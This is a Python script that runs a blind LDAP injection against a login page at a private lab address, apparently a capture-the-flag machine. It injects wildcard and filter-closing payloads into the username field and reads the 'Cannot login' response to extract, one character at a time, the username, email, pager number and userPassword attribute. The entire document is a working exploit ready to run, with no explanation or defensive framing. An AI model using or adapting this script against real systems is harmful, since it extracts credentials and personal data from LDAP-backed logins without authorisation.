#!/usr/bin/env python3

import requests
import string
import sys
import time

def brute_next_char(inputUsernameStr, chars):

    for c in chars:
        while True:
            try:
                time.sleep(0.3)
                resp = requests.post('http://10.10.10.122/login.php', data={'inputUsername': inputUsernameStr.format(c=c), 'inputOTP': '0000'})
                break
            except requests.exceptions.ConnectionError:
                time.sleep(10)
                continue
        if 'Cannot login' in resp.text:
            sys.stdout.write(c)
            sys.stdout.flush()
            return c
    return ''


def brute_username():

    username = ''
    while True:
        next_char = brute_next_char(f'{username}{{c}}%2a', string.ascii_lowercase)
        if next_char == '':
            break
        username += next_char
    print()
    return username


def brute_attribute(attrib, character_set):
    
    otp = ''
    while True:
        next_dig = brute_next_char(f'ldapuser%29%28{attrib}%3d{otp}{{c}}%2a', character_set)
        if next_dig == '':
            break
        otp += next_dig
    print()
    return otp
    
options = 'all username mail pager userPassword'.split(' ')
user_opt = sys.argv[1] if len(sys.argv) > 1 else 'all'

if user_opt not in options:
    print("Usage: {} [attribute]\nAvailable Options:\n  {}\n".format(sys.argv[0], '\n  '.join(options)))
    sys.exit()

if user_opt in ['all', 'username']:
    print("Bruting Username")
    brute_username()
if user_opt in ['all', 'mail']:
    print("Bruting mail")
    brute_attribute('mail', string.ascii_lowercase + string.digits + '@.')
if user_opt in ['all', 'pager']:
    print("Bruting pager")
    brute_attribute('pager', string.digits)
if user_opt in ['all', 'userPassword']:
    print("Bruting userPassword")
    brute_attribute('userPassword', string.printable)
